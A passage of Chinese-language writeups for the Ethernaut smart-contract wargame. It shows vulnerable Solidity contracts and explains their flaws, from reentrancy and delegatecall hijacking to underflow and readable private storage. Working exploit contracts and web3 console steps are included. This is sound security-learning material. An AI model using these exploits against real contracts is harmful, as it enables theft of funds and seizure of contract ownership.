calldata\uff0c\u5b83\u4f1a\u901a\u8fc7 multicall \u8c03\u7528 deposit\uff0c\u7136\u540e\u628a\u4e24\u4e2a\u8fd9\u4e2a calldata \u4f20\u5165 multicall\uff0c\u540c\u65f6\u9644\u5e26 value 0.001 ether\uff0c\u8fd9\u6837 balances[player] \u5c31\u4f1a\u589e\u52a0 0.002 ether\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 execute \u76f4\u63a5\u63d0\u53d6\u51fa\u8fd9 0.002 ether \u63d0\u53d6\u540e\u5408\u7ea6\u8d26\u6237\u7684 balance \u53d8\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e86 > web3 . utils . sha3 ( \"deposit()\" ). slice ( 0 , 10 ) // deposit selector '0xd0e30db0' > data = ( await contract . methods [ \"multicall(bytes[])\" ]. request ([ \"0xd0e30db0\" ])). data // \u6784\u9020\u901a\u8fc7 multicall \u8c03\u7528 deposit \u7684 calldata '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000' > await contract . multicall ([ data , data ], { value : toWei ( \"0.001\" )}) > await getBalance ( instance ) '0.002' > contract . execute ( player , toWei ( \"0.002\" ), 0 > await getBalance ( instance ) '0' > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<level address>' > contract . setMaxBalance ( player ) > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<player address>' Motorbike \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity < 0.7.0 ; import \"@openzeppelin/contracts/utils/Address.sol\" ; import \"@openzeppelin/contracts/proxy/Initializable.sol\" ; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; struct AddressSlot { address value ; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor ( address _logic ) public { require ( Address . isContract ( _logic ), \"ERC1967: new implementation is not a contract\" ); _getAddressSlot ( _IMPLEMENTATION_SLOT ). value = _logic ; ( bool success ,) = _logic . delegatecall ( abi . encodeWithSignature ( \"initialize()\" ) ); require ( success , \"Call failed\" ); } // Delegates the current call to `implementation`. function _delegate ( address implementation ) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy ( 0 , 0 , calldatasize ()) let result : = delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) returndatacopy ( 0 , 0 , returndatasize ()) switch result case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate ( _getAddressSlot ( _IMPLEMENTATION_SLOT ). value ); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r_slot : = slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; address public upgrader ; uint256 public horsePower ; struct AddressSlot { address value ; } function initialize () external initializer { horsePower = 1000 ; upgrader = msg.sender ; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall ( address newImplementation , bytes memory data ) external payable { _authorizeUpgrade (); _upgradeToAndCall ( newImplementation , data ); } // Restrict to upgrader role function _authorizeUpgrade () internal view { require ( msg.sender == upgrader , \"Can't upgrade\" ); } // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall ( address newImplementation , bytes memory data ) internal { // Initial upgrade and setup call _setImplementation ( newImplementation ); if ( data . length > 0 ) { ( bool success ,) = newImplementation . delegatecall ( data ); require ( success , \"Call failed\" ); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation ( address newImplementation ) private { require ( Address . isContract ( newImplementation ), \"ERC1967: new implementation is not a contract\" ); AddressSlot storage r ; assembly { r_slot : = _IMPLEMENTATION_SLOT } r . value = newImplementation ; } } \u540c\u6837\u6709\u4e9b\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u8981\u9500\u6bc1\u6389 Engine \u56e0\u4e3a\u6574\u4e2a\u5408\u7ea6\u4e2d\u90fd\u6ca1\u6709 selfdestruct\uff0c\u6240\u4ee5\u8981\u8f7d\u5165\u81ea\u5df1\u7684\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7 upgradeToAndCall \u51fd\u6570\u6765\u8f7d\u5165\u5408\u7ea6\u5e76\u8c03\u7528\uff0c\u8fd9\u9700\u8981\u901a\u8fc7 _authorizeUpgrade \u51fd\u6570\u7684\u68c0\u67e5\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5 sender \u662f\u5426\u662f upgrader\uff0c\u800c\u6539\u53d8 upgrader \u53ef\u4ee5\u901a\u8fc7 initialize \u51fd\u6570\u6765\u5b8c\u6210 \u6240\u4ee5\u653b\u51fb\u6d41\u7a0b\u5c31\u662f\u5148\u901a\u8fc7 getStorageAt \u6765\u5f97\u5230\u90e8\u7f72\u7684 Engine \u7684\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528 initialize\uff0cupgradeToAndCall \u4e00\u4e2a\u90e8\u7f72\u7684\u65b0\u5408\u7ea6\uff0c\u8ba9\u5b83\u89e6\u53d1 selfdestruct \u5c31\u597d\u4e86 \u65b0\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { function exp () public { selfdestruct ( payable ( 0 )); } } \u653b\u51fb\u6d41\u7a0b\uff1a > await web3 . eth . getStorageAt ( instance , \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\" ) '0x000000000000000000000000<engine address>' > engine = \"0x<engine address>\" > data = web3 . utils . sha3 ( \"initialize()\" ). slice ( 0 , 10 ) '0x8129fc1c' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data }) > await web3 . eth . call ({ from : player , to : engine , data : web3 . utils . sha3 ( \"upgrader()\" ). slice ( 0 , 10 )}) // \u9a8c\u8bc1 upgrader '0x000000000000000000000000<player address>' > exp = \"<Exploit contract address>\" > expdata = web3 . utils . sha3 ( \"exp()\" ). slice ( 0 , 10 ) '0xab60ffda' > signature = { name : 'upgradeToAndCall' , type : 'function' , inputs : [ { type : 'address' , name : 'newImplementation' }, { type : 'bytes memory' , name : 'data' } ] } { name : 'upgradeToAndCall' , type : 'function' , inputs : Array ( 2 )} > data = web3 . eth . abi . encodeFunctionCall ( upgradeSignature , [ exp , expdata ]) '0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data })","title":"Ethernaut"},{"location":"writeups/ethernaut/#ethernaut-writeups","text":"Abstract https://ethernaut.openzeppelin.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Rinkeby \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.rinkeby.io/ \u6216\u8005 https://faucets.chain.link/rinkeby \u641e\u70b9\u6d4b\u8bd5\u5e01\uff08\u4e3b\u8981\u7528\u6765\u540e\u7eed\u652f\u4ed8 gas\uff09 \u5728 ethernaut \u4e0a\u8fde\u63a5 MetaMask \u6bcf\u4e00\u9053\u9898\u76ee\u5148\u751f\u6210\u65b0\u5b9e\u4f8b\uff0c\u5728 console \u4e2d\u5b8c\u6210\u540e\u63d0\u4ea4\u5b9e\u4f8b","title":"Ethernaut Writeups"},{"location":"writeups/ethernaut/#hello-ethernaut","text":"\u6309\u7167\u9898\u76ee\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8c03\u7528\u51fd\u6570\u5373\u53ef","title":"Hello Ethernaut"},{"location":"writeups/ethernaut/#fallback","text":"\u7ed9\u4e86\u5408\u7ea6\u6e90\u7801 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Fallback { using SafeMath for uint256 ; mapping ( address => uint ) public contributions ; address payable public owner ; constructor () public { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { owner . transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u76ee\u6807\u662f\u62ff\u5230\u8fd9\u4e2a\u5408\u7ea6\u7684\u63a7\u5236\u6743\uff0c\u8f6c\u51fa\u6240\u6709\u4f59\u989d \u4e3b\u8981\u903b\u8f91\u662f contribute \u51fd\u6570\u4f1a\u589e\u52a0\u8c03\u7528\u8005\u7684 contributions\uff0c\u5f53\u5927\u4e8e 1000 ether \u7684\u65f6\u5019\uff0c\u4f1a\u628a\u6240\u6709\u6743\u8f6c\u7ed9\u73a9\u5bb6\u3002\u901a\u8fc7\u8fd9\u4e2a\u6765\u83b7\u5f97\u63a7\u5236\u6743\u662f\u4e0d\u73b0\u5b9e\u7684 \u800c\u53e6\u4e00\u4e2a\u4f1a\u53d1\u751f\u6240\u6709\u6743\u8f6c\u6362\u7684\u51fd\u6570\u662f receive \u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a fallback \u51fd\u6570\uff0c\u4f1a\u5728\u5408\u7ea6\u8d26\u6237\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u65f6\u5019\u89e6\u53d1\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u8981\u5411\u5408\u7ea6\u53d1\u51fa\u5e26\u6709\u4ee5\u592a\u5e01\u7684\u4ea4\u6613\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u8f6c\u79fb\u6240\u6709\u6743 \u800c\u4e4b\u524d\u8fd8\u9700\u8981\u5148\u4fdd\u8bc1 contributions \u5927\u4e8e 0\uff0c\u6240\u4ee5\u89e3\u6cd5\uff1a > contract . contribute ({ value : 1 }) // \u4f7f contributions \u5927\u4e8e 0 > contract . sendTransaction ({ value : 1 }) // \u89e6\u53d1 fallback \u8f6c\u79fb\u6240\u6709\u6743 > contract . withdraw () // \u8f6c\u51fa\u6240\u6709\u4f59\u989d","title":"Fallback"},{"location":"writeups/ethernaut/#fallout","text":"\u8981\u6c42\u5f97\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743 \u6839\u636e\u5408\u7ea6\u6e90\u7801\u53ef\u4ee5\u53d1\u73b0\u5b83\u7684 constructor \u7684\u51fd\u6570\u540d\u4e3a Fal1out\uff0c\u5e76\u4e0d\u662f\u5408\u7ea6\u540d Fallout\uff0c\u6709 l1 \u7684\u5dee\u522b \u6240\u4ee5\u76f4\u63a5\u8c03\u7528 contract.Fal1out() \u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u5408\u7ea6\u6240\u6709\u6743","title":"Fallout"},{"location":"writeups/ethernaut/#coin-flip","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract CoinFlip { using SafeMath for uint256 ; uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8981\u6c42\u8fde\u7eed\u731c\u5bf9\u5341\u6b21\uff0c\u5408\u7ea6\u4e2d\u7ed9\u51fa\u4e86\u5b83\u53d6\u968f\u673a\u6570\u7684\u65b9\u5f0f\uff0c\u5373\u5c06 block.number \u51cf\u4e00\uff0c\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u518d\u9664\u4ee5 FACTOR \u5224\u65ad\u662f\u5426\u4e3a 1 \u6240\u4ee5\u5199\u4e00\u4e2a\u65b0\u5408\u7ea6\u6765\u83b7\u53d6\u540c\u6837\u7684 block.number \u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b54\u6848 \u56e0\u4e3a\u5224\u65ad\u4e86 lashHash == blockValue \u7684\u65f6\u5019 revert\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\uff0c\u9010\u6b21\u731c\u6d4b\uff0c\u8fde\u7eed\u731c 10 \u6b21 exp // SPDX-License-Identifier: GPL-3.0 pragma solidity ^ 0.6.0 ; /* code of CoinFlip */ contract Exploit { using SafeMath for uint256 ; CoinFlip p ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor ( address challenge ) public { p = CoinFlip ( challenge ); } function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; p . flip ( side ); } }","title":"Coin Flip"},{"location":"writeups/ethernaut/#telephone","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Telephone { address public owner ; constructor () public { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u4e5f\u662f\u9700\u8981\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u800c\u8c03\u7528\u5408\u7ea6\u4e2d\u7684 changeOwner \u51fd\u6570\u6765\u8f6c\u79fb\u6240\u6709\u6743\u7684\u8bdd\uff0c\u9700\u8981\u4f7f tx.origin \u548c msg.sender \u4e0d\u540c \u5b83\u4eec\u7684\u533a\u522b\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u6240\u4ee5\u5982\u679c\u901a\u8fc7 \u8d26\u6237 A -> \u5408\u7ea6 A -> \u5408\u7ea6 B \u6765\u8c03\u7528\u7684\u8bdd\uff0ctx.origin \u5c31\u662f\u8d26\u6237 A\uff0c\u800c\u5bf9\u4e8e\u5408\u7ea6 B \u6765\u8bf4\uff0cmsg.sender \u662f\u5408\u7ea6 A \u6240\u4ee5\u8fd9\u9898\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u6765\u8c03\u7528\u9898\u76ee\u7684 changeOwner \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Telephone */ contract Exploit { Telephone p = Telephone ( < instance address > ); function exp () public { p . changeOwner ( msg.sender ); } }","title":"Telephone"},{"location":"writeups/ethernaut/#token","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u5f00\u5c40\u81ea\u5df1\u7684 balance \u662f 20\uff0c\u76ee\u7684\u662f\u589e\u52a0\u81ea\u5df1\u7684 balance \u53ef\u4ee5\u53d1\u73b0 transfer \u4e2d\u662f\u76f4\u63a5\u5c06 sender \u7684 balance \u51cf\u8f6c\u8d26\u7684 value\uff0c\u800c\u5982\u679c value \u8d85\u8fc7 balance \u5219\u4f1a\u53d1\u751f\u6ea2\u51fa\uff0c\u56e0\u4e3a\u662f uint\uff0c\u5219\u4f1a\u53d8\u4e3a\u5f88\u5927\u7684\u503c \u6240\u4ee5\u901a\u8fc7 await contract . transfer ( < any address > , 21 ) \u5373\u53ef\u4f7f\u81ea\u5df1\u7684 balance \u6ea2\u51fa\u53d8\u5927","title":"Token"},{"location":"writeups/ethernaut/#delegation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Delegate { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) public { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u76ee\u7684\u8fd8\u662f\u62ff\u5230\u6240\u6709\u6743\uff0c\u5373\u6267\u884c Delegate \u4e2d\u7684 pwn \u51fd\u6570 \u53ef\u4ee5\u901a\u8fc7\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528 delegatecall \u6765\u901a\u8fc7 msg.data \u8c03\u7528 pwn \u51fd\u6570 data \u4e2d\u524d\u56db\u4e2a\u5b57\u8282\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u524d\u9762\u7684 sha3 \u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u5982\u679c\u6ca1\u6709\u4f20\u5165\u6570\u636e\u53ef\u4ee5\u7701\u7565 \u6240\u4ee5\u8ba1\u7b97\u51fa pwn() \u7684 sha3 \u7136\u540e\u4f5c\u4e3a data \u4f20\u7ed9 fallback \u5373\u53ef > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" })","title":"Delegation"},{"location":"writeups/ethernaut/#force","text":"\u9898\u76ee\u662f\u4e00\u4e2a\u7a7a\u7684\u5408\u7ea6\uff0c\u8981\u6c42\u5411\u5176\u4e2d\u8f6c\u8d26 \u800c\u4e00\u4e2a\u5408\u7ea6\u5728\u81ea\u6bc1\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5c06\u4f59\u989d\u5168\u90e8\u5f3a\u5236\u8f6c\u5230\u53e6\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u6240\u4ee5\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\u7136\u540e\u81ea\u6bc1\uff0c\u628a\u4f59\u989d\u8f6c\u5230\u5b9e\u4f8b\u5730\u5740\u4e0a\u5c31\u53ef\u4ee5\u4e86 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } }","title":"Force"},{"location":"writeups/ethernaut/#vault","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u8981 unlock \u8fd9\u4e2a\u5408\u7ea6\u8d26\u6237\uff0c\u4e5f\u5c31\u662f\u8981\u627e\u5230 password \u867d\u7136 password \u88ab\u8bbe\u4e3a\u4e86 private\uff0c\u4f46\u662f\u5728\u533a\u5757\u4e2d\u7684\u6570\u636e\u4ecd\u7136\u662f\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u53ea\u8981 getStorageAt \u5c31\u53ef\u4ee5\u4e86\uff1a > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb","title":"Vault"},{"location":"writeups/ethernaut/#king","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5f53\u9898\u76ee\u518d\u6b21\u51fa\u8d44\u66f4\u9ad8\u7684\u65f6\u5019\uff0cking \u5c31\u4f1a\u56de\u5230\u9898\u76ee\u4e0a\uff0c\u8981\u4fdd\u6301 king \u5728\u81ea\u5df1\u8eab\u4e0a \u800c\u6bcf\u6b21\u66f4\u6362 king \u7684\u65f6\u5019\u90fd\u4f1a\u5148\u628a\u91d1\u989d transfer \u7ed9\u4e0a\u4e00\u4e2a king\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u63a5\u6536\u5c31\u597d\u4e86 \u53ef\u4ee5\u4f7f\u7528 fallback\uff0c\u7136\u540e\u51fd\u6570\u91cc\u9762\u76f4\u63a5 revert // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call . gas ( 10000000 ). value ( msg.value )( \"\" ); } fallback () external { revert (); } } \u6ce8\u610f\u9700\u8981\u652f\u4ed8\u5927\u4e8e 1 ether \u624d\u53ef\u4ee5\u5148\u62ff\u5230 king","title":"King"},{"location":"writeups/ethernaut/#re-entrancy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f msg . sender . call { value : _amount }( \"\" ) \uff0c\u5e76\u4e14\u5728\u8fd9\u4e4b\u540e\u624d\u51cf\u5c11 balances \u800c\u8fd9\u4e2a call \u4f1a\u6389\u5230 fallback \u4e2d\uff0c\u5982\u679c fallback \u91cc\u518d\u6b21\u8c03\u7528\u4e86 withdraw \u5c31\u5b9e\u73b0\u4e86\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u65ad\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u7684\u4f59\u989d\u76f4\u5230\u4e3a 0 \u5148\u901a\u8fc7 await getBalance ( instance ) \u5f97\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\u7684 balance \u4e3a 0.001 ether\uff0c\u6240\u4ee5\u6bcf\u6b21 withdraw 0.001 ether \u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u9996\u5148\u76f4\u63a5\u90e8\u7f72\u5408\u7ea6\uff0c\u7136\u540e contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) \u5148 donate 0.001 ether\uff0c\u7136\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\u63d0\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4f59\u989d","title":"Re-entrancy"},{"location":"writeups/ethernaut/#elevator","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u76ee\u7684\u662f\u4f7f\u7535\u68af\u8fbe\u5230\u6700\u9876\u5c42\uff0c\u5373\u4f7f\u9898\u76ee\u5408\u7ea6\u7684 top \u4e3a true \u56e0\u4e3a top \u7684\u53d8\u5316\u53ea\u4f1a\u5728 goTo \u91cc\u53d1\u751f\u53d8\u5316\uff0c\u5e76\u4e14\u53ea\u6709\u5728 isLastFloor \u4e3a false \u7684\u65f6\u5019\u624d\u4f1a\u6539 top\uff0c\u800c\u4e14\u4e24\u6b21\u8c03\u7528 isLastFloor \u7684\u8f93\u5165\u4e00\u6837 \u6240\u4ee5\u53ea\u9700\u8981\u8ba9\u7b2c\u4e00\u6b21\u8c03\u7528 isLastFloor \u8fd4\u56de false\uff0c\u7b2c\u4e8c\u6b21\u8fd4\u56de true \u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } } \u8fd9\u6837\u5728\u90e8\u7f72\u4e4b\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u8ba9 top \u4e3a true","title":"Elevator"},{"location":"writeups/ethernaut/#privacy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Privacy { bool public locked = true ; uint256 public ID = block.timestamp ; uint8 private flattening = 10 ; uint8 private denomination = 255 ; uint16 private awkwardness = uint16 ( now ); bytes32 [ 3 ] private data ; constructor ( bytes32 [ 3 ] memory _data ) public { data = _data ; } function unlock ( bytes16 _key ) public { require ( _key == bytes16 ( data [ 2 ])); locked = false ; } } \u548c Vault \u90a3\u9898\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u8981\u8bfb\u53d6 private \u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 unlock \u540c\u6837\u6765\u7528 web3 . eth . getStorageAt \u6765 dump \u51fa storage\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x0000000000000000000000000000000000000000000000000000000000000001' > await web3 . eth . getStorageAt ( instance , 1 ) '0x00000000000000000000000000000000000000000000000000000000623b0e73' > await web3 . eth . getStorageAt ( instance , 2 ) '0x000000000000000000000000000000000000000000000000000000000e73ff0a' > await web3 . eth . getStorageAt ( instance , 3 ) '0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569' > await web3 . eth . getStorageAt ( instance , 4 ) '0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364' > await web3 . eth . getStorageAt ( instance , 5 ) '0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf' > await web3 . eth . getStorageAt ( instance , 6 ) '0x0000000000000000000000000000000000000000000000000000000000000000' \u4e0d\u96be\u770b\u51fa 0 \u5904\u5b58\u50a8\u7684\u662f bool locked\uff0c1 \u5904\u662f\u4e00\u4e2a 256 \u4f4d ID\uff0c2 \u5904\u662f\u5269\u4e0b\u7684\u4e24\u4e2a uint8\u3001\u4e00\u4e2a uint16 \u62fc\u51fa\u6765\u7684\uff0c\u800c 3\uff5e5 \u5c31\u662f data \u4e86 \u6240\u4ee5 data[2] \u4e5f\u5c31\u662f 